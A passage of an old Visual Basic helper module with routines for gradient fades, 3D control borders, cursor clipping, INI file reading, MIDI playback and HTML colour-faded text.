pic.Line (Loo * FadeW - 10, -10)-(9000, 1000), RGB(FirstColor(1), FirstColor(2), FirstColor(3)), BF
DoEvents
FirstColor(1) = FirstColor(1) + DivideNum(1)
FirstColor(2) = FirstColor(2) + DivideNum(2)
FirstColor(3) = FirstColor(3) + DivideNum(3)
Next Loo

For Loo2 = 51 To 99
'Draws Fade
pic.Line (Loo2 * FadeW - 10, -10)-(9000, 1000), RGB(SecondColor(1), SecondColor(2), SecondColor(3)), BF
DoEvents
SecondColor(1) = SecondColor(1) + DivideNum2(1)
SecondColor(2) = SecondColor(2) + DivideNum2(2)
SecondColor(3) = SecondColor(3) + DivideNum2(3)
Next Loo2
End Sub
Sub FadePreview_4Colors(pic As Object, a1%, a2%, a3%, b1%, b2%, b3%, b4%, C1%, C2%, C3%, d1%, d2%, d3%)
On Error Resume Next 'If an Error go to Next
Static FirstColor(3) As Double
Static SecondColor(3) As Double
Static ThirdColor(3) As Double
Static FourthColor(3) As Double
Static SplitNum(3) As Double
Static SplitNum2(3) As Double
Static SplitNum3(3) As Double
Static DivideNum(3) As Double
Static DivideNum2(3) As Double
Static DivideNum3(3) As Double
Dim FadeW As Integer
Dim Loo As Integer
Dim Loo2 As Integer
Dim Loo3 As Integer

'First Color
FirstColor(1) = a1
FirstColor(2) = a2
FirstColor(3) = a3
'Second Color
SecondColor(1) = b1
SecondColor(2) = b2
SecondColor(3) = b3
'Third Color
ThirdColor(1) = C1
ThirdColor(2) = C2
ThirdColor(3) = C3
'Fourth Color
FourthColor(1) = d1
FourthColor(2) = d2
FourthColor(3) = d3
'Splits First and Second Color
SplitNum(1) = SecondColor(1) - FirstColor(1)
SplitNum(2) = SecondColor(2) - FirstColor(2)
SplitNum(3) = SecondColor(3) - FirstColor(3)

SplitNum2(1) = ThirdColor(1) - SecondColor(1)
SplitNum2(2) = ThirdColor(2) - SecondColor(2)
SplitNum2(3) = ThirdColor(3) - SecondColor(3)

SplitNum3(1) = FourthColor(1) - ThirdColor(1)
SplitNum3(2) = FourthColor(2) - ThirdColor(2)
SplitNum3(3) = FourthColor(3) - ThirdColor(3)

DivideNum(1) = SplitNum(1) / 25
DivideNum(2) = SplitNum(2) / 25
DivideNum(3) = SplitNum(3) / 25

DivideNum2(1) = SplitNum2(1) / 25
DivideNum2(2) = SplitNum2(2) / 25
DivideNum2(3) = SplitNum2(3) / 25

DivideNum3(1) = SplitNum3(1) / 25
DivideNum3(2) = SplitNum3(2) / 25
DivideNum3(3) = SplitNum3(3) / 25
FadeW = pic.Width / 100

For Loo = 0 To 24
'Draws Fade
pic.Line (Loo * FadeW - 10, -10)-(9000, 1000), RGB(FirstColor(1), FirstColor(2), FirstColor(3)), BF
DoEvents
FirstColor(1) = FirstColor(1) + DivideNum(1)
FirstColor(2) = FirstColor(2) + DivideNum(2)
FirstColor(3) = FirstColor(3) + DivideNum(3)
Next Loo

For Loo2 = 25 To 49
'Draws Fade
pic.Line (Loo2 * FadeW - 10, -10)-(9000, 1000), RGB(SecondColor(1), SecondColor(2), SecondColor(3)), BF
DoEvents
SecondColor(1) = SecondColor(1) + DivideNum2(1)
SecondColor(2) = SecondColor(2) + DivideNum2(2)
SecondColor(3) = SecondColor(3) + DivideNum2(3)
Next Loo2

For Loo3 = 50 To 75
'Draws Fade
pic.Line (Loo3 * FadeW - 10, -10)-(9000, 1000), RGB(ThirdColor(1), ThirdColor(2), ThirdColor(3)), BF
DoEvents
ThirdColor(1) = ThirdColor(1) + DivideNum3(1)
ThirdColor(2) = ThirdColor(2) + DivideNum3(2)
ThirdColor(3) = ThirdColor(3) + DivideNum3(3)
Next Loo3
End Sub




Sub File_Open(Pth As String)
X% = Shell(Pth)
End Sub

 Function StringInList(thelist As ListBox, FindMe As String)
If thelist.ListCount = 0 Then GoTo Nope
For a = 0 To thelist.ListCount - 1
thelist.ListIndex = a
If UCase(thelist.Text) = UCase(FindMe) Then
StringInList = a
Exit Function
End If
Next a
Nope:
StringInList = -1
End Function




Private Sub CenterOnRect(LPRect As Rect)
   '
   ' Use API to place cursor at center of rectangle.
   '
   Call SetCursorPos(LPRect.Left + (LPRect.Right - LPRect.Left) \ 2, _
                     LPRect.Top + (LPRect.Bottom - LPRect.Top) \ 2)
End Sub


Private Sub GetClientScrnRect(frm As Form, rC As Rect)
   Dim X As Integer
   Dim Y As Integer
   '
   ' Retrieve position info from API.
   ' Assume worst-case: sizable border.
   '
   Call GetWindowRect((frm.hwnd), rC)
   X = GetSystemMetrics(SM_CXFRAME)
   Y = GetSystemMetrics(SM_CYFRAME)
   '
   ' Calculate screen coordinates of client area.
   '
   rC.Left = rC.Left + X
   rC.Right = rC.Right - X
   rC.Top = rC.Top + Y + GetSystemMetrics(SM_CYCAPTION)
   rC.Bottom = rC.Bottom - Y
End Sub
Public Sub Release()
   '
   ' Clear clipping by passing NULL pointer
   '
   Call ClipCursor(ByVal vbNullString)
End Sub






Private Sub RestrictToRect(LPRect As Rect)
   '
   ' Use API to restrict cursor to a rectangle.
   '
   Call ClipCursor(LPRect)
End Sub



Public Sub MoveForm(frm As Form)
ReleaseCapture
X = SendMessage(frm.hwnd, WM_NCLBUTTONDOWN, HTCAPTION, 0&)
'Put in a Label or Picbox in MouseDown:
'MoveForm me

End Sub

Public Function GetFromINI(AppName$, KeyName$, FileName$) As String
Dim RetStr As String
RetStr = String(255, Chr(0))
GetFromINI = Left(RetStr, GetPrivateProfileString(AppName$, ByVal KeyName$, "", RetStr, Len(RetStr), FileName$))
'Writing to a INI:
'R% = WritePrivateProfileString("Type", "Name", "Value", App.Path + "\KnK.ini")

'Read:
'Name$ = GetFromINI("Type", "Name", App.Path + "\KnK.ini")
'If Name$ = "Value" Then

End Function
Sub In3D(Parent As Form, Who As Control)

'Dark Gray
Parent.Line (Who.Left - 30, Who.Top - 30)-(Who.Left + Who.Width + 30, Who.Top - 30), RGB(127, 127, 127)
Parent.Line ((Who.Left - 30), (Who.Top - 30))-(Who.Left - 30, Who.Top + Who.Height + 30), RGB(127, 127, 127)

'Black
Parent.Line (Who.Left - 10, Who.Top - 10)-(Who.Left + Who.Width + 10, Who.Top - 10), RGB(0, 0, 0)
Parent.Line ((Who.Left - 10), (Who.Top))-(Who.Left - 10, Who.Top + Who.Height + 10), RGB(0, 0, 0)


'Gray
Parent.Line (Who.Left - 10, Who.Top + Who.Height)-(Who.Left + Who.Width, Who.Top + Who.Height), RGB(191, 191, 191)
Parent.Line -(Who.Left + Who.Width, Who.Top - 30), RGB(191, 191, 191)

'White
Parent.Line (Who.Left - 30, Who.Top + Who.Height + 20)-(Who.Left + Who.Width + 20, Who.Top + Who.Height + 20), RGB(255, 255, 255)
Parent.Line -(Who.Left + Who.Width + 20, Who.Top - 40), RGB(255, 255, 255)

End Sub

Sub Out3D(Parent As Form, Who As Control)
'White
Parent.Line (Who.Left - 30, Who.Top - 30)-(Who.Left + Who.Width + 30, Who.Top - 30), RGB(255, 255, 255)
Parent.Line ((Who.Left - 30), (Who.Top - 30))-(Who.Left - 30, Who.Top + Who.Height + 30), RGB(255, 255, 255)

'Gray
Parent.Line (Who.Left - 10, Who.Top - 10)-(Who.Left + Who.Width + 10, Who.Top - 10), RGB(191, 191, 191)
Parent.Line ((Who.Left - 10), (Who.Top))-(Who.Left - 10, Who.Top + Who.Height + 10), RGB(191, 191, 191)


'Dark Gray
Parent.Line (Who.Left - 10, Who.Top + Who.Height)-(Who.Left + Who.Width, Who.Top + Who.Height), RGB(127, 127, 127)
Parent.Line -(Who.Left + Who.Width, Who.Top - 30), RGB(127, 127, 127)

'Black
Parent.Line (Who.Left - 30, Who.Top + Who.Height + 20)-(Who.Left + Who.Width + 20, Who.Top + Who.Height + 20), RGB(0, 0, 0)
Parent.Line -(Who.Left + Who.Width + 20, Who.Top - 40), RGB(0, 0, 0)

End Sub
Sub InDown3D(Parent As Form, Who As Control)
'White
Parent.Line (Who.Left - 30, Who.Top - 30)-(Who.Left + Who.Width + 30, Who.Top - 30), RGB(127, 127, 127)
Parent.Line ((Who.Left - 30), (Who.Top - 30))-(Who.Left - 30, Who.Top + Who.Height + 30), RGB(127, 127, 127)

'Gray
Parent.Line (Who.Left - 10, Who.Top - 10)-(Who.Left + Who.Width + 10, Who.Top - 10), RGB(191, 191, 191)
Parent.Line ((Who.Left - 10), (Who.Top))-(Who.Left - 10, Who.Top + Who.Height + 10), RGB(191, 191, 191)


'Dark Gray
Parent.Line (Who.Left - 10, Who.Top + Who.Height)-(Who.Left + Who.Width, Who.Top + Who.Height), RGB(255, 255, 255)
Parent.Line -(Who.Left + Who.Width, Who.Top - 30), RGB(255, 255, 255)

'Black
Parent.Line (Who.Left - 30, Who.Top + Who.Height + 20)-(Who.Left + Who.Width + 20, Who.Top + Who.Height + 20), RGB(0, 0, 0)
Parent.Line -(Who.Left + Who.Width + 20, Who.Top - 40), RGB(0, 0, 0)

End Sub
Sub Off3D(Parent As Form, Who As Control)

Parent.Line (Who.Left - 30, Who.Top - 30)-(Who.Left + Who.Width + 30, Who.Top - 30), RGB(191, 191, 191)
Parent.Line ((Who.Left - 30), (Who.Top - 30))-(Who.Left - 30, Who.Top + Who.Height + 30), RGB(191, 191, 191)


Parent.Line (Who.Left - 10, Who.Top - 10)-(Who.Left + Who.Width + 10, Who.Top - 10), RGB(191, 191, 191)
Parent.Line ((Who.Left - 10), (Who.Top))-(Who.Left - 10, Who.Top + Who.Height + 10), RGB(191, 191, 191)



Parent.Line (Who.Left - 10, Who.Top + Who.Height)-(Who.Left + Who.Width, Who.Top + Who.Height), RGB(191, 191, 191)
Parent.Line -(Who.Left + Who.Width, Who.Top - 30), RGB(191, 191, 191)


Parent.Line (Who.Left - 30, Who.Top + Who.Height + 20)-(Who.Left + Who.Width + 20, Who.Top + Who.Height + 20), RGB(191, 191, 191)
Parent.Line -(Who.Left + Who.Width + 20, Who.Top - 40), RGB(191, 191, 191)

End Sub

Sub Panel3DIn(Parent As Form, Who As Control)

'Top Dark Gray
Parent.Line (Who.Left + Who.Width, Who.Top - 10)-(Who.Left - 30, Who.Top - 10), RGB(127, 127, 127)

'Left Dark Gray
Parent.Line (Who.Left - 10, Who.Top)-(Who.Left - 10, Who.Top + Who.Height), RGB(127, 127, 127)

'Bottom White
Parent.Line -(Who.Left + Who.Width, Who.Top + Who.Height), RGB(255, 255, 255)

'Right White
Parent.Line -(Who.Left + Who.Width, Who.Top - 30), RGB(255, 255, 255)

End Sub
Sub Panel3DOff(Parent As Form, Who As Control)
'Top Dark Gray
Parent.Line (Who.Left + Who.Width, Who.Top - 10)-(Who.Left - 30, Who.Top - 10), RGB(191, 191, 191)

'Left Dark Gray
Parent.Line (Who.Left - 10, Who.Top)-(Who.Left - 10, Who.Top + Who.Height), RGB(191, 191, 191)

'Bottom White
Parent.Line -(Who.Left + Who.Width, Who.Top + Who.Height), RGB(191, 191, 191)

'Right White
Parent.Line -(Who.Left + Who.Width, Who.Top - 30), RGB(191, 191, 191)

End Sub


Sub Panel3DOut(Parent As Form, Who As Control)
'Top White
Parent.Line (Who.Left + Who.Width, Who.Top - 10)-(Who.Left - 30, Who.Top - 10), RGB(255, 255, 255)

'Left White
Parent.Line (Who.Left - 10, Who.Top)-(Who.Left - 10, Who.Top + Who.Height), RGB(255, 255, 255)

'Bottom Dark Gray
Parent.Line -(Who.Left + Who.Width, Who.Top + Who.Height), RGB(127, 127, 127)

'Right Dark Gray
Parent.Line -(Who.Left + Who.Width, Who.Top - 30), RGB(127, 127, 127)


End Sub

Sub PlayMIDI(MIDI As String)
Dim SN As Long
File$ = MIDI
Snd = mciExecute("play " & File$)
End Sub

Sub Form3D(frmForm As Form)

       Const cPi = 3.1415926
       Dim intLineWidth As Integer
       intLineWidth = 5
       '     'save scale mode
       Dim intSaveScaleMode As Integer
       intSaveScaleMode = frmForm.ScaleMode
       frmForm.ScaleMode = 3
       Dim intScaleWidth As Integer
       Dim intScaleHeight As Integer
       intScaleWidth = frmForm.ScaleWidth
       intScaleHeight = frmForm.ScaleHeight
       '     'clear form
       frmForm.Cls
       '     'draw white lines
       frmForm.Line (0, intScaleHeight)-(intLineWidth, 0), &HFFFFFF, BF
       frmForm.Line (0, intLineWidth)-(intScaleWidth, 0), &HFFFFFF, BF
       '     'draw grey lines
       frmForm.Line (intScaleWidth, 0)-(intScaleWidth - intLineWidth, intScaleHeight), &H808080, BF
       frmForm.Line (intScaleWidth, intScaleHeight - intLineWidth)-(0, intScaleHeight), &H808080, BF
       '     'draw triangles(actually circles) at corners
       Dim intCircleWidth As Integer
       intCircleWidth = Sqr(intLineWidth * intLineWidth + intLineWidth * intLineWidth)
       frmForm.FillStyle = 0
       frmForm.FillColor = QBColor(15)
       frmForm.Circle (intLineWidth, intScaleHeight - intLineWidth), intCircleWidth, QBColor(15), -3.1415926, -3.90953745777778 '-180 * cPi / 180, -224 * cPi / 180
       frmForm.Circle (intScaleWidth - intLineWidth, intLineWidth), intCircleWidth, QBColor(15), -0.78539815, -1.5707963 ' -45 * cPi / 180, -90 * cPi / 180
       '     'draw black frame
       frmForm.Line (0, intScaleHeight)-(0, 0), 0
       frmForm.Line (0, 0)-(intScaleWidth - 1, 0), 0
       frmForm.Line (intScaleWidth - 1, 0)-(intScaleWidth - 1, intScaleHeight - 1), 0
       frmForm.Line (0, intScaleHeight - 1)-(intScaleWidth - 1, intScaleHeight - 1), 0
       '     'restore scale mode
       frmForm.ScaleMode = intSaveScaleMode
End Sub
Sub Draw3dBorderAroundForm(frmForm As Form)

       Const cPi = 3.1415926
       Dim intLineWidth As Integer
       intLineWidth = 5
       '     'save scale mode
       Dim intSaveScaleMode As Integer
       intSaveScaleMode = frmForm.ScaleMode
       frmForm.ScaleMode = 3
       Dim intScaleWidth As Integer
       Dim intScaleHeight As Integer
       intScaleWidth = frmForm.ScaleWidth
       intScaleHeight = frmForm.ScaleHeight
       '     'clear form
       frmForm.Cls
       '     'draw white lines
       frmForm.Line (0, intScaleHeight)-(intLineWidth, 0), &HFFFFFF, BF
       frmForm.Line (0, intLineWidth)-(intScaleWidth, 0), &HFFFFFF, BF
       '     'draw grey lines
       frmForm.Line (intScaleWidth, 0)-(intScaleWidth - intLineWidth, intScaleHeight), &H808080, BF
       frmForm.Line (intScaleWidth, intScaleHeight - intLineWidth)-(0, intScaleHeight), &H808080, BF
       '     'draw triangles(actually circles) at corners
       Dim intCircleWidth As Integer
       intCircleWidth = Sqr(intLineWidth * intLineWidth + intLineWidth * intLineWidth)
       frmForm.FillStyle = 0
       frmForm.FillColor = QBColor(15)
       frmForm.Circle (intLineWidth, intScaleHeight - intLineWidth), intCircleWidth, QBColor(15), -3.1415926, -3.90953745777778 '-180 * cPi / 180, -224 * cPi / 180
       frmForm.Circle (intScaleWidth - intLineWidth, intLineWidth), intCircleWidth, QBColor(15), -0.78539815, -1.5707963 ' -45 * cPi / 180, -90 * cPi / 180
       '     'draw black frame
       frmForm.Line (0, intScaleHeight)-(0, 0), 0
       frmForm.Line (0, 0)-(intScaleWidth - 1, 0), 0
       frmForm.Line (intScaleWidth - 1, 0)-(intScaleWidth - 1, intScaleHeight - 1), 0
       frmForm.Line (0, intScaleHeight - 1)-(intScaleWidth - 1, intScaleHeight - 1), 0
       '     'restore scale mode
       frmForm.ScaleMode = intSaveScaleMode
End Sub

Function Fade_TwelveColorsBack(a1%, a2%, a3%, b1%, b2%, b3%, C1%, C2%, C3%, d1%, d2%, d3%, e1%, e2%, e3%, f1%, f2%, f3%, G1%, G2%, G3%, h1%, h2%, h3%, i1%, i2%, i3%, j1%, j2%, j3%, k1%, k2%, k3%, l1%, l2%, l3%, Text2Fade$, Wavy As Boolean)

Cnt% = Len(Text2Fade) / 2
If Cnt% Mod 2 = 1 Then
hlf1$ = Left(Text2Fade, Cnt%)
hlf2$ = Right(Text2Fade, Cnt% - 1)
Else
hlf1$ = Left(Text2Fade, Cnt%)
hlf2$ = Right(Text2Fade, Cnt%)
End If
p1$ = Fade_SixColorsBack(a1, a2, a3, b1, b2, b3, C1, C2, C3, d1, d2, d3, e1, e2, e3, f1, f2, f3, hlf1$, Wavy)
p2$ = Fade_SixColorsBack(G1, G2, G3, h1, h2, h3, i1, i2, i3, j1, j2, j3, k1, k2, k3, l1, l2, l3, hlf2$, Wavy)

Fade_TwelvetColorsBack = p1$ + p2$
End Function
Function Fade_TwelveColors(a1%, a2%, a3%, b1%, b2%, b3%, C1%, C2%, C3%, d1%, d2%, d3%, e1%, e2%, e3%, f1%, f2%, f3%, G1%, G2%, G3%, h1%, h2%, h3%, i1%, i2%, i3%, j1%, j2%, j3%, k1%, k2%, k3%, l1%, l2%, l3%, Text2Fade$, Wavy As Boolean)

Cnt% = Len(Text2Fade) / 2
If Cnt% Mod 2 = 1 Then
hlf1$ = Left(Text2Fade, Cnt%)
hlf2$ = Right(Text2Fade, Cnt% - 1)
Else
hlf1$ = Left(Text2Fade, Cnt%)
hlf2$ = Right(Text2Fade, Cnt%)
End If
p1$ = Fade_SixColors(a1, a2, a3, b1, b2, b3, C1, C2, C3, d1, d2, d3, e1, e2, e3, f1, f2, f3, hlf1$, Wavy)
p2$ = Fade_SixColors(G1, G2, G3, h1, h2, h3, i1, i2, i3, j1, j2, j3, k1, k2, k3, l1, l2, l3, hlf2$, Wavy)

Fade_TwelvetColors = p1$ + p2$
End Function
Function Fade_SixColors(a1%, a2%, a3%, b1%, b2%, b3%, C1%, C2%, C3%, d1%, d2%, d3%, e1%, e2%, e3%, f1%, f2%, f3%, Text2Fade$, Wavy As Boolean)

Cnt% = Len(Text2Fade) / 2
If Cnt% Mod 2 = 1 Then
hlf1$ = Left(Text2Fade, Cnt%)
hlf2$ = Right(Text2Fade, Cnt% - 1)
Else
hlf1$ = Left(Text2Fade, Cnt%)
hlf2$ = Right(Text2Fade, Cnt%)
End If
p1$ = Fade_ThreeColors(a1, a2, a3, b1, b2, b3, C1, C2, C3, hlf1$, Wavy)
p2$ = Fade_ThreeColors(d1, d2, d3, e1, e2, e3, f1, f2, f3, hlf2$, Wavy)

Fade_SixColors = p1$ + p2$
End Function
Function Fade_SixColorsBack(a1%, a2%, a3%, b1%, b2%, b3%, C1%, C2%, C3%, d1%, d2%, d3%, e1%, e2%, e3%, f1%, f2%, f3%, Text2Fade$, Wavy As Boolean)

Cnt% = Len(Text2Fade) / 2
If Cnt% Mod 2 = 1 Then
hlf1$ = Left(Text2Fade, Cnt%)
hlf2$ = Right(Text2Fade, Cnt% - 1)
Else
hlf1$ = Left(Text2Fade, Cnt%)
hlf2$ = Right(Text2Fade, Cnt%)
End If
p1$ = Fade_ThreeColorsBack(a1, a2, a3, b1, b2, b3, C1, C2, C3, hlf1$, Wavy)
p2$ = Fade_ThreeColorsBack(d1, d2, d3, e1, e2, e3, f1, f2, f3, hlf2$, Wavy)

Fade_SixColorsBack = p1$ + p2$
End Function
Function Fade_FiveColorsBack(R1%, G1%, b1%, R2%, G2%, b2%, R3%, G3%, b3%, R4%, G4%, b4%, R5%, G5%, B5%, thetext$, Wavy As Boolean)
    textlen% = Len(thetext)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    Loop Until textlen% < 1
    
    part1$ = Left(thetext, fstlen%)
    part2$ = Mid(thetext, fstlen% + 1, seclen%)
    part3$ = Mid(thetext, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Right(thetext, frthlen%)
    
  
    textlen% = Len(part1$)
    For i = 1 To textlen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b2 - b1) / textlen% * i) + b1, ((G2 - G1) / textlen% * i) + G1, ((R2 - R1) / textlen% * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = ""
        If dawave = 2 Then wave1$ = ""
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = ""
        If dawave = 2 Then wave2$ = ""
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Back=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i

    textlen% = Len(part2$)
    For i = 1 To textlen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b3 - b2) / textlen% * i) + b2, ((G3 - G2) / textlen% * i) + G2, ((R3 - R2) / textlen% * i) + R2)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = ""
        If dawave = 2 Then wave1$ = ""
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = ""
        If dawave = 2 Then wave2$ = ""
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Back=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    
 
    textlen% = Len(part3$)
    For i = 1 To textlen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b4 - b3) / textlen% * i) + b3, ((G4 - G3) / textlen% * i) + G3, ((R4 - R3) / textlen% * i) + R3)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = ""
        If dawave = 2 Then wave1$ = ""
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = ""
        If dawave = 2 Then wave2$ = ""
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Back=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    

    textlen% = Len(part4$)
    For i = 1 To textlen%
        TextDone$ = Left(part4$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B5 - b4) / textlen% * i) + b4, ((G5 - G4) / textlen% * i) + G4, ((R5 - R4) / textlen% * i) + R4)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = ""
        If dawave = 2 Then wave1$ = ""
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = ""
        If dawave = 2 Then wave2$ = ""
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded4$ = Faded4$ + "<Font Back=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    
    Fade_FiveColorsBack = Faded1$ + Faded2$ + Faded3$ + Faded4$
End Function
Function Fade_FiveColors(R1%, G1%, b1%, R2%, G2%, b2%, R3%, G3%, b3%, R4%, G4%, b4%, R5%, G5%, B5%, thetext$, Wavy As Boolean)
    textlen% = Len(thetext)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    Loop Until textlen% < 1
    
    part1$ = Left(thetext, fstlen%)
    part2$ = Mid(thetext, fstlen% + 1, seclen%)
    part3$ = Mid(thetext, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Right(thetext, frthlen%)
    
  
    textlen% = Len(part1$)
    For i = 1 To textlen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b2 - b1) / textlen% * i) + b1, ((G2 - G1) / textlen% * i) + G1, ((R2 - R1) / textlen% * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i

    textlen% = Len(part2$)
    For i = 1 To textlen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b3 - b2) / textlen% * i) + b2, ((G3 - G2) / textlen% * i) + G2, ((R3 - R2) / textlen% * i) + R2)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    
 
    textlen% = Len(part3$)
    For i = 1 To textlen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b4 - b3) / textlen% * i) + b3, ((G4 - G3) / textlen% * i) + G3, ((R4 - R3) / textlen% * i) + R3)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    

    textlen% = Len(part4$)
    For i = 1 To textlen%
        TextDone$ = Left(part4$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B5 - b4) / textlen% * i) + b4, ((G5 - G4) / textlen% * i) + G4, ((R5 - R4) / textlen% * i) + R4)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded4$ = Faded4$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    
    Fade_FiveColors = Faded1$ + Faded2$ + Faded3$ + Faded4$
End Function


Function Fade_FourColors(R1%, G1%, b1%, R2%, G2%, b2%, R3%, G3%, b3%, R4%, G4%, b4%, thetext$, Wavy As Boolean)
    textlen% = Len(thetext)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    Loop Until textlen% < 1
    
    part1$ = Left(thetext, fstlen%)
    part2$ = Mid(thetext, fstlen% + 1, seclen%)
    part3$ = Right(thetext, thrdlen%)
    
 
    textlen% = Len(part1$)
    For i = 1 To textlen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b2 - b1) / textlen% * i) + b1, ((G2 - G1) / textlen% * i) + G1, ((R2 - R1) / textlen% * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    textlen% = Len(part2$)
    For i = 1 To textlen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b3 - b2) / textlen% * i) + b2, ((G3 - G2) / textlen% * i) + G2, ((R3 - R2) / textlen% * i) + R2)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    

    textlen% = Len(part3$)
    For i = 1 To textlen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b4 - b3) / textlen% * i) + b3, ((G4 - G3) / textlen% * i) + G3, ((R4 - R3) / textlen% * i) + R3)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
